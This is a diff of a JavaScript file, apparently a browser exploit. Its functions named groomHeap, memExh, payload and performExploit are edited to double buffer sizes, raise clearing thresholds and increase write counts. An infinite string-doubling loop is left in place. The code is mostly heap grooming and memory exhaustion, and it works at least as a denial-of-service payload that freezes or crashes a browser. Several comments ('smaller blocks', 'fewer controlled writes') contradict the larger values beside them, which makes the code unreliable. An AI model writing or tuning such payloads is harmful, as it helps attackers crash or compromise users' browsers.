@@ -21,7 +21,7 @@ function groomHeap() {
 
     // Allocate and deallocate in patterns
     for (let i = 0; i < 100; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(500000); // Allocate smaller blocks
+        let buffer = new ArrayBuffer(1000000); // Allocate smaller blocks
         tempArray.push(buffer);
     }
 
@@ -37,8 +37,8 @@ function groomHeap() {
 function memExh() {
     let bufferArray = [];
     for (let i = 0; i < 4096; i++) { // Reduced iterations
-        bufferArray.push(new ArrayBuffer(500000)); // Allocate smaller buffers
-        if (bufferArray.length > 500) { // Less aggressive clearing
+        bufferArray.push(new ArrayBuffer(1000000)); // Allocate smaller buffers
+        if (bufferArray.length > 4096) { // Less aggressive clearing
             bufferArray = []; // Clear buffer array to exhaust memory
         }
     }
@@ -54,8 +54,8 @@ function payload() {
     while (true) {
         // String concatenation
         largeString += largeString;
-        if (largeString.length > 50000000) { // Lower threshold for reset
-            largeString = "A".repeat(500000); // Reset string to avoid overflow
+        if (largeString.length > 100000000) { // Lower threshold for reset
+            largeString = "A".repeat(1000000); // Reset string to avoid overflow
         }
 
         memExh(); // Exhaust memory
@@ -79,7 +79,7 @@ function performExploit() {
     // Start the memory corruption
 
     // Perform the controlled memory write
-    for (let i = 0; i < 500; i++) { // Fewer controlled writes
+    for (let i = 0; i < 1024; i++) { // Fewer controlled writes
         // Controlled write operations
         let buffer = new ArrayBuffer(1000); // Smaller allocation for controlled overwrite
         controlledBuffers.push(buffer);
